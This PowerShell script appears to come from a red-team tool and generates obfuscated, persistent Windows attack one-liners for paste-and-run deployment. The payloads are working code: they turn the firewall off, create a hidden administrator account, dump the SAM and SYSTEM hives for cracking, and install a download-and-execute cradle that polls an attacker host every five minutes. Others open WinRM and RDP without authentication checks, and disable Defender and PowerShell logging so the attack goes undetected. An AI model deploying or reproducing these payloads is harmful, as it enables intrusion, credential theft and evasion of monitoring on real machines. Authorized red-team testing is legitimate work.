<#
.SYNOPSIS
    Red Team Showcase — generate deployment one-liners for all ADS v2.4 showcase scenarios.

.DESCRIPTION
    Runs on Kali/Linux (pwsh). Generates ready-to-deploy ADS one-liners for every
    scenario in tests/RED-TEAM-SHOWCASE.md. Each scenario output file is self-contained:
    paste OPTION 1 on Windows and the scenario deploys.

    Scenarios:
      A1  Firewall Down (FW-002 — netsh, Defender-clean)
      A2  Invisible Admin Account (USR-002 — hidden from login screen)
      A3  Credential Harvest (CRED-001 — SAM+SYSTEM hives to ProgramData)
      A4  C2 Persistent Cradle (download-and-execute, every 5 min)
      A5  Lateral Movement Prep (WinRM + PSRemoting + TrustedHosts wildcard)
      C1  Clipboard Rickroll (MEME-006 — persistent hijack, SYSTEM OK)
      C2  Caps Lock Disco (MEME-005 — LED blink 60s, SYSTEM OK)
      C3  Matrix Rain (MEME-004 — ASCII console animation, SYSTEM OK)
      C4  Wall of Notepads (MEME-002 — registry persist required)
      C5  OIIA Spinning Cat (MEME-008 — proof-of-compromise, registry persist)
      C6  OIIA Desktop Graffiti (MEME-009 — drops .txt everywhere, SYSTEM OK)
      D1  Initial Access Package (FW + RDP + hidden admin + disable logging)
      D2  Stealth Long Game (cred harvest + Defender quiet disable + log disable)
      D3  Chaos Mode (clipboard + caps + notepads simultaneously)

.PARAMETER Scenario
    Generate a single scenario by ID (e.g., A1, C4, D3). Default: all scenarios.

.PARAMETER OutputDir
    Directory where output files are saved. Default: /tmp/showcase/

.PARAMETER AttackerIP
    Your Kali IP address (used in A4 C2 cradle). Default: ATTACKER_IP (placeholder).

.PARAMETER Obfuscate
    Stealth tier for all generated scenarios. Default: Advanced

.PARAMETER DryRun
    Print what would be generated without running ADS-OneLiner.ps1.

.PARAMETER Help
    Show this help.

.EXAMPLE
    # Generate all scenarios with default settings
    pwsh tests/red-team-showcase.ps1 -OutputDir /tmp/showcase/

.EXAMPLE
    # Generate all scenarios with your attacker IP and Paranoid stealth
    pwsh tests/red-team-showcase.ps1 -AttackerIP 192.168.1.100 -Obfuscate Paranoid -OutputDir /tmp/showcase/

.EXAMPLE
    # Generate a single scenario
    pwsh tests/red-team-showcase.ps1 -Scenario A1 -OutputDir /tmp/

.EXAMPLE
    # Dry run — see what would be generated
    pwsh tests/red-team-showcase.ps1 -DryRun

.NOTES
    Author: Queue + Red Team
    Version: 1.0 (ADS v2.4)
    Requires: pwsh, ADS-OneLiner.ps1 in ../src/
    Run from project root or tests/ directory.
    AUTHORIZED USE ONLY — see docs/PROJECT-AUTHORIZATION.md
#>

[CmdletBinding()]
param(
    [string]$Scenario = 'all',
    [string]$OutputDir = '/tmp/showcase/',
    [string]$AttackerIP = 'ATTACKER_IP',
    [ValidateSet('None','Basic','Advanced','Paranoid')]
    [string]$Obfuscate = 'Advanced',
    [switch]$DryRun,
    [switch]$Help
)

# --- Help ---
if ($Help) {
    Get-Help $PSCommandPath -Full
    exit 0
}

# --- Locate ADS-OneLiner.ps1 ---
$scriptDir = Split-Path $PSCommandPath -Parent
$projectRoot = Split-Path $scriptDir -Parent
$oneLiner = Join-Path $projectRoot 'src/ADS-OneLiner.ps1'
if (-not (Test-Path $oneLiner)) {
    $oneLiner = Join-Path $scriptDir '../src/ADS-OneLiner.ps1'
}
if (-not (Test-Path $oneLiner)) {
    Write-Error "Cannot find ADS-OneLiner.ps1. Run from project root or tests/ directory."
    exit 1
}
$oneLiner = Resolve-Path $oneLiner

# --- Setup output directory ---
if (-not $DryRun) {
    if (-not (Test-Path $OutputDir)) {
        New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    }
}

# --- Scenario definitions ---
$scenarios = [ordered]@{

    'A1' = @{
        Name    = 'Firewall Down (FW-002)'
        Desc    = 'Disable all Windows Firewall profiles via netsh. No PowerShell cmdlets in logs. Defender-validated CLEAN.'
        Context = 'SYSTEM — works from Task Scheduler'
        Persist = 'registry'
        Instances = 3
        Triggers  = @('AtLogOn','AtStartup')
        Admin     = $true
        Payload   = 'cmd /c "netsh advfirewall set allprofiles state off"'
        Validate  = 'cmd /c "netsh advfirewall show allprofiles state"  → all profiles: OFF'
        Validated = $true
    }

    'A2' = @{
        Name    = 'Invisible Admin Account (USR-002)'
        Desc    = 'Create local admin hidden from login screen and User Accounts panel via SpecialAccounts\UserList registry key.'
        Context = 'SYSTEM — works from Task Scheduler'
        Persist = 'task'
        Instances = 1
        Triggers  = @('AtLogOn','AtStartup')
        Admin     = $true
        PayloadScript = @'
cmd /c "net user svcUpdate Pa$$w0rd2026! /add & net localgroup Administrators svcUpdate /add"
$p='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}
New-ItemProperty -Path $p -Name svcUpdate -Value 0 -PropertyType DWord -Force|Out-Null
'@
        Validate  = 'net user svcUpdate → shows account; login screen → account not listed'
        Validated = $true
    }

    'A3' = @{
        Name    = 'Credential Harvest — SAM+SYSTEM (CRED-001)'
        Desc    = 'Dump SAM and SYSTEM hives to C:\ProgramData for offline cracking. Tasks run as SYSTEM — has access. Defender-validated CLEAN.'
        Context = 'SYSTEM — works from Task Scheduler'
        Persist = 'task'
        Instances = 1
        Triggers  = @('AtLogOn','AtStartup')
        Admin     = $true
        Payload   = 'cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y"'
        Validate  = 'Test-Path C:\ProgramData\s.dat → True. Crack: secretsdump.py -sam s.dat -system sy.dat LOCAL'
        Validated = $true
    }

    'A4' = @{
        Name    = "C2 Persistent Cradle (C2-001) — replace $AttackerIP"
        Desc    = 'Persistent download-and-execute beacon. Fires every 5 minutes. Server returns empty for no-op, PowerShell for tasking.'
        Context = 'SYSTEM — works from Task Scheduler'
        Persist = 'task'
        Instances = 2
        Triggers  = @('AtLogOn','AtStartup')
        Admin     = $true
        PayloadScript = @"
`$w=New-Object Net.WebClient
`$s=`$w.DownloadString('http://${AttackerIP}:8080/agent.ps1')
[scriptblock]::Create(`$s).Invoke()
"@
        Validate  = "python3 -m http.server 8080 on Kali → requests appear every 5 min from target"
        Validated = $false
    }

    'A5' = @{
        Name    = 'Lateral Movement Prep (LAT-001 + LAT-002)'
        Desc    = 'Open WinRM, enable PSRemoting, set wildcard TrustedHosts. After firing: Enter-PSSession from any network host.'
        Context = 'SYSTEM — works from Task Scheduler'
        Persist = 'task'
        Instances = 1
        Triggers  = @('AtLogOn','AtStartup')
        Admin     = $true
        PayloadScript = @'
cmd /c "winrm quickconfig -quiet"
Enable-PSRemoting -Force -SkipNetworkProfileCheck
Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
'@
        Validate  = "Enter-PSSession -ComputerName TARGET -Credential (Get-Credential) from Kali"
        Validated = $false
    }

    'C1' = @{
        Name    = 'Clipboard Rickroll (MEME-006)'
        Desc    = 'Replaces clipboard every 30 seconds. Works from SYSTEM. Every copy-paste attempt: red team greeting.'
        Context = 'SYSTEM — clipboard is shared across sessions'
        Persist = 'task'
        Instances = 1
        Triggers  = @('AtLogOn','AtStartup')
        Admin     = $false
        PayloadScript = @'
Add-Type -AssemblyName PresentationCore
while($true){
  [Windows.Clipboard]::SetText('Never gonna give you up — Red Team was here — ADS v2.4')
  Start-Sleep -Seconds 30
}
'@
        Validate  = 'Get-Clipboard → shows red team message (updates every 30s)'
        Validated = $true
    }

    'C2' = @{
        Name    = 'Caps Lock Disco (MEME-005)'
        Desc    = 'Blinks Caps/Num/Scroll Lock LEDs for 60 seconds. Works from SYSTEM — keyboard LEDs respond to SYSTEM key events.'
        Context = 'SYSTEM — keyboard is physical, not session-specific'
        Persist = 'task'
        Instances = 1
        Triggers  = @('AtLogOn','AtStartup')
        Admin     = $false
        PayloadScript = @'
$wsh=New-Object -ComObject WScript.Shell
$end=(Get-Date).AddSeconds(60)
while((Get-Date)-lt $end){
  $wsh.SendKeys('{CAPSLOCK}'); $wsh.SendKeys('{NUMLOCK}'); $wsh.SendKeys('{SCROLLLOCK}')
  Start-Sleep -Milliseconds 250
}
'@
        Validate  = 'Watch keyboard LEDs blink for 60 seconds'
        Validated = $true
    }

    'C3' = @{
        Name    = 'Matrix Rain (MEME-004)'
        Desc    = '2-minute green ASCII Matrix rain animation in a spawned console window. Works from SYSTEM (Session 0 spawns visible console).'
        Context = 'SYSTEM — visible console window'
        Persist = 'task'
        Instances = 1
        Triggers  = @('AtLogOn','AtStartup')
        Admin     = $false
        PayloadScript = @'
$host.UI.RawUI.WindowTitle='System Diagnostics'
$host.UI.RawUI.BackgroundColor='Black'
$host.UI.RawUI.ForegroundColor='Green'
Clear-Host
$chars=@('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F')
$width=$host.UI.RawUI.WindowSize.Width
$end=(Get-Date).AddMinutes(2)
while((Get-Date)-lt $end){
  $col=Get-Random -Minimum 0 -Maximum $width
  $char=$chars[(Get-Random -Maximum $chars.Count)]
  $pos=New-Object System.Management.Automation.Host.Coordinates $col,(Get-Random -Minimum 0 -Maximum $host.UI.RawUI.WindowSize.Height)
  $host.UI.RawUI.CursorPosition=$pos
  Write-Host $char -NoNewline -ForegroundColor Green
  Start-Sleep -Milliseconds 20
}
'@
        Validate  = 'Green ASCII rain appears in a new console window for 2 minutes'
        Validated = $true
    }

    'C4' = @{
        Name    = 'Wall of Notepads (MEME-002) — registry persist'
        Desc    = '8 cascading Notepad windows open at user logon. REQUIRES registry persist (task runs in Session 0 where windows are invisible).'
        Context = 'USER SESSION — registry Run key fires at logon'
        Persist = 'registry'
        Instances = 1
        Triggers  = @('AtLogOn')
        Admin     = $false
        PayloadScript = @'
1..8 | ForEach-Object {
  Start-Process notepad
  Start-Sleep -Milliseconds 300
}
'@
        Validate  = '8 Notepad windows appear at next logon'
        Validated = $true
    }

    'C5' = @{
        Name    = 'OIIA Spinning Cat (MEME-008) — registry persist'
        Desc    = 'Spinning ASCII cat animation + live recon printout for 30 seconds. Proof-of-compromise. REQUIRES registry persist.'
        Context = 'USER SESSION — registry Run key fires at logon'
        Persist = 'registry'
        Instances = 1
        Triggers  = @('AtLogOn')
        Admin     = $false
        PayloadScript = @'
$frames=@('(=^._.^=)','(=^._.^)=','(^._.^=)=','=(^._.^)=')
$end=(Get-Date).AddSeconds(30)
$i=0
while((Get-Date)-lt $end){
  [Console]::SetCursorPosition(0,0)
  Write-Host $frames[$i%4] -ForegroundColor Cyan
  Write-Host "RED TEAM WAS HERE — ADS v2.4" -ForegroundColor Red
  $i++; Start-Sleep -Milliseconds 250
}
Write-Host "`n=== PROOF OF COMPROMISE ===" -ForegroundColor Red
Write-Host "Hostname : $env:COMPUTERNAME"
Write-Host "User     : $env:USERNAME"
Write-Host "Time     : $(Get-Date)"
Start-Sleep -Seconds 8
'@
        Validate  = 'Spinning cat + recon info appears for 30 seconds at logon'
        Validated = $false
    }

    'C6' = @{
        Name    = 'OIIA Desktop Graffiti (MEME-009)'
        Desc    = 'Drops OIIA_RED_TEAM_WAS_HERE.txt to Public Desktop and Temp. Visible in File Explorer. Works from SYSTEM.'
        Context = 'SYSTEM — file writes work from Task Scheduler'
        Persist = 'task'
        Instances = 1
        Triggers  = @('AtLogOn','AtStartup')
        Admin     = $false
        PayloadScript = @'
$msg = "RED TEAM WAS HERE`nApparition Delivery System v2.4`nHostname: $env:COMPUTERNAME`nTime: $(Get-Date)"
@('C:\Users\Public\Desktop\OIIA_RED_TEAM_WAS_HERE.txt',"$env:TEMP\OIIA_RED_TEAM_WAS_HERE.txt") |
  ForEach-Object { $msg | Out-File -FilePath $_ -Force -Encoding UTF8 -EA 0 }
'@
        Validate  = 'Check C:\Users\Public\Desktop\ and C:\Windows\Temp\ for OIIA_RED_TEAM_WAS_HERE.txt'
        Validated = $false
    }

    'D1' = @{
        Name    = 'Initial Access Package'
        Desc    = 'FW down + RDP enabled (NLA off) + hidden admin + PS logging disabled. Four attack paths in one task.'
        Context = 'SYSTEM — all actions work from Task Scheduler'
        Persist = 'task'
        Instances = 2
        Triggers  = @('AtLogOn','AtStartup','OnUnlock')
        Admin     = $true
        PayloadScript = @'
# Firewall down
cmd /c "netsh advfirewall set allprofiles state off"
# RDP enabled, NLA off
$r='HKLM:\System\CurrentControlSet\Control\Terminal Server'
Set-ItemProperty $r -Name fDenyTSConnections -Value 0
Set-ItemProperty "$r\WinStations\RDP-Tcp" -Name UserAuthentication -Value 0
cmd /c 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'
# Hidden admin
cmd /c "net user svcUpdate Pa$$w0rd2026! /add & net localgroup Administrators svcUpdate /add"
$p='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}
New-ItemProperty -Path $p -Name svcUpdate -Value 0 -PropertyType DWord -Force|Out-Null
# Disable PS logging
$lp='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell'
@('ScriptBlockLogging','ModuleLogging') | ForEach-Object {
  $kp="$lp\$_"; if(!(Test-Path $kp)){New-Item $kp -Force|Out-Null}
  Set-ItemProperty $kp -Name "Enable$_" -Value 0 -Type DWord -Force
}
'@
        Validate  = 'FW off + RDP accessible + svcUpdate in admin group + PS logging off'
        Validated = $false
    }

    'D2' = @{
        Name    = 'Stealth Long Game'
        Desc    = 'Credential harvest + quiet Defender disable + PS logging off. Designed to run undetected long-term.'
        Context = 'SYSTEM — all actions work from Task Scheduler'
        Persist = 'task'
        Instances = 1
        Triggers  = @('AtLogOn','AtStartup')
        Admin     = $true
        PayloadScript = @'
# Credential harvest
cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y"
# Defender real-time monitoring off (policy, quieter than stopping service)
$p='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}
Set-ItemProperty -Path $p -Name DisableAntiSpyware -Value 1 -Type DWord -Force
$rp="$p\Real-Time Protection"
if(!(Test-Path $rp)){New-Item -Path $rp -Force|Out-Null}
Set-ItemProperty -Path $rp -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force
# PS Script Block Logging off
$lp='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
if(!(Test-Path $lp)){New-Item $lp -Force|Out-Null}
Set-ItemProperty $lp -Name EnableScriptBlockLogging -Value 0 -Type DWord -Force
'@
        Validate  = 'C:\ProgramData\s.dat + sy.dat present; Defender RTP off; SBL off'
        Validated = $false
    }

    'D3-clip' = @{
        Name    = 'Chaos Mode — Clipboard'
        Desc    = 'Part 1 of 3 chaos payload. Deploy all three D3 scenarios for simultaneous effect.'
        Context = 'USER SESSION — registry persist'
        Persist = 'registry'
        Instances = 1
        Triggers  = @('AtLogOn')
        Admin     = $false
        PayloadScript = @'
Add-Type -AssemblyName PresentationCore
while($true){ [Windows.Clipboard]::SetText('RED TEAM WAS HERE — ADS v2.4'); Start-Sleep 30 }
'@
        Validate  = 'Clipboard replaced at next logon'
        Validated = $true
    }

    'D3-caps' = @{
        Name    = 'Chaos Mode — Caps Lock Disco'
        Desc    = 'Part 2 of 3 chaos payload.'
        Context = 'USER SESSION — registry persist'
        Persist = 'registry'
        Instances = 1
        Triggers  = @('AtLogOn')
        Admin     = $false
        PayloadScript = @'
$w=New-Object -ComObject WScript.Shell; $e=(Get-Date).AddSeconds(60)
while((Get-Date)-lt $e){ $w.SendKeys('{CAPSLOCK}'); $w.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 300 }
'@
        Validate  = 'LEDs blink for 60 seconds at logon'
        Validated = $true
    }

    'D3-note' = @{
        Name    = 'Chaos Mode — Notepads'
        Desc    = 'Part 3 of 3 chaos payload.'
        Context = 'USER SESSION — registry persist'
        Persist = 'registry'
        Instances = 1
        Triggers  = @('AtLogOn')
        Admin     = $false
        PayloadScript = @'
1..8 | ForEach-Object { Start-Process notepad; Start-Sleep -Milliseconds 300 }
'@
        Validate  = '8 Notepads at logon'
        Validated = $true
    }
}

# --- Filter to requested scenario ---
if ($Scenario -ne 'all') {
    $key = $Scenario.ToUpper()
    # Handle D3 sub-scenarios
    if ($key -eq 'D3') {
        $toRun = $scenarios.Keys | Where-Object { $_ -like 'D3*' }
    } elseif ($scenarios.ContainsKey($key)) {
        $toRun = @($key)
    } else {
        Write-Error "Unknown scenario '$Scenario'. Valid: $($scenarios.Keys -join ', ')"
        exit 1
    }
} else {
    $toRun = $scenarios.Keys
}

# --- Temp file cleanup list ---
$tempFiles = [System.Collections.Generic.List[string]]::new()

# --- Generate each scenario ---
$total = ($toRun | Measure-Object).Count
$done = 0

Write-Host ""
Write-Host "=== ADS v2.4 Red Team Showcase Generator ===" -ForegroundColor Cyan
Write-Host "Scenarios  : $($toRun -join ', ')" -ForegroundColor Gray
Write-Host "Obfuscate  : $Obfuscate" -ForegroundColor Gray
Write-Host "Output dir : $OutputDir" -ForegroundColor Gray
Write-Host "Attacker IP: $AttackerIP" -ForegroundColor Gray
if ($DryRun) { Write-Host "DRY RUN    : yes (no files generated)" -ForegroundColor Yellow }
Write-Host ""

foreach ($id in $toRun) {
    $s = $scenarios[$id]
    $done++
    $outFile = Join-Path $OutputDir "showcase-$($id.ToLower().Replace('-','')).txt"

    Write-Host "[$done/$total] $id — $($s.Name)" -ForegroundColor Cyan
    Write-Host "         $($s.Desc)" -ForegroundColor Gray
    Write-Host "         Context  : $($s.Context)" -ForegroundColor DarkGray
    Write-Host "         Persist  : $($s.Persist) | Admin: $($s.Admin) | Validated: $($s.Validated)" -ForegroundColor DarkGray
    Write-Host "         Validate : $($s.Validate)" -ForegroundColor DarkGray

    if ($DryRun) {
        Write-Host "         [DRY RUN] Would generate: $outFile" -ForegroundColor Yellow
        Write-Host ""
        continue
    }

    # Write payload to temp file if needed
    $payloadArg = $null
    $payloadFileArg = $null
    $tempFile = $null

    if ($s.ContainsKey('Payload')) {
        $payloadArg = $s.Payload
    } elseif ($s.ContainsKey('PayloadScript')) {
        $tempFile = [System.IO.Path]::GetTempFileName() + '.ps1'
        $s.PayloadScript | Out-File -FilePath $tempFile -Encoding UTF8
        $payloadFileArg = $tempFile
        $tempFiles.Add($tempFile)
    } else {
        Write-Host "         [SKIP] No payload defined for $id" -ForegroundColor Yellow
        continue
    }

    # Build argument hashtable — hashtable splatting passes [string[]] directly, avoiding
    # cross-process argument parsing which fails ValidateSet for multi-value trigger arrays.
    $invokeArgs = @{
        Obfuscate     = $Obfuscate
        Persist       = $s.Persist
        Trigger       = $s.Triggers
        InstanceCount = $s.Instances
        OutputFile    = $outFile
    }

    if ($payloadArg)     { $invokeArgs['Payload']     = $payloadArg }
    if ($payloadFileArg) { $invokeArgs['PayloadFile'] = $payloadFileArg }

    try {
        & $oneLiner @invokeArgs 2>&1 | Out-Null
        if (Test-Path $outFile) {
            $size = (Get-Item $outFile).Length
            Write-Host "         [OK] Generated: $outFile ($size bytes)" -ForegroundColor Green
        } else {
            Write-Host "         [FAIL] Output file not created" -ForegroundColor Red
        }
    } catch {
        Write-Host "         [ERROR] $_" -ForegroundColor Red
    }

    Write-Host ""
}

# --- Cleanup temp files ---
foreach ($tf in $tempFiles) {
    if (Test-Path $tf) { Remove-Item $tf -Force -EA 0 }
}

# --- Summary ---
if (-not $DryRun) {
    Write-Host "=== Generation Complete ===" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Output files:" -ForegroundColor White
    if (Test-Path $OutputDir) {
        Get-ChildItem $OutputDir -Filter 'showcase-*.txt' | Sort-Object Name |
            ForEach-Object { Write-Host "  $($_.FullName)  ($($_.Length) bytes)" -ForegroundColor Gray }
    }
    Write-Host ""
    Write-Host "Paste OPTION 1 from each file on the Windows target as Administrator." -ForegroundColor Yellow
    Write-Host "For registry-persist scenarios (C4, C5, D3): standard user is sufficient." -ForegroundColor Yellow
    Write-Host ""
    Write-Host "See tests/RED-TEAM-SHOWCASE.md for full scenario descriptions." -ForegroundColor Cyan
}
